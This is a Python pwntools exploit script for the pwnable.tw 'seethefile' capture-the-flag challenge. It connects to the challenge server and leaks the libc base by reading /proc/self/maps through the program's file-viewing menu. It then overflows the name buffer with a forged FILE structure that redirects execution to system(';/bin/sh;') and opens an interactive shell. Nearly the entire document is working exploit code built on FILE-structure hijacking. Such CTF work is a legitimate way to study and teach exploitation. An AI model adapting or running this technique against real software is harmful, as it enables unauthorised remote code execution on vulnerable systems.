#!/usr/bin/env python3

import pwn

io = pwn.remote('chall.pwnable.tw', 10200)
elf = pwn.ELF('./seethefile')
libc = pwn.ELF('./libc_32.so.6')

def openfile(filename):
	io.recvuntil('Your choice :')
	io.sendline(str(1))
	io.recvuntil('What do you want to see :')
	io.sendline(filename)

def readfile():
	io.recvuntil('Your choice :')
	io.sendline(str(2))

def writetoscreen():
	io.recvuntil('Your choice :')
	io.sendline(str(3))
	data = io.recvuntil('---------------MENU---------------', drop = True)
	return data

def closefile():
	io.recvuntil('Your choice :')
	io.sendline(str(4))

def leavename(name):
	io.recvuntil('Your choice :')
	io.sendline(str(5))
	io.recvuntil('Leave your name :')
	io.sendline(name)

# leak libc address via /proc/self/maps

openfile('/proc/self/maps')
readfile()
writetoscreen()
readfile()
data = writetoscreen()
libc_base = int(data.decode().splitlines()[1].split(' ')[0].split('-')[0], 16)
system_addr = libc_base + libc.sym[b'system']
closefile()

# FILE structure oriented programming

name = b'A' * 0x20
name += pwn.p32(0x0804b284)
name += (pwn.p32(0xffffdfff) + b';/bin/sh;').ljust(0x94, b'\x00')
name += pwn.p32(0x0804b31c)
name += pwn.p32(system_addr) * 128

leavename(name)

io.interactive()
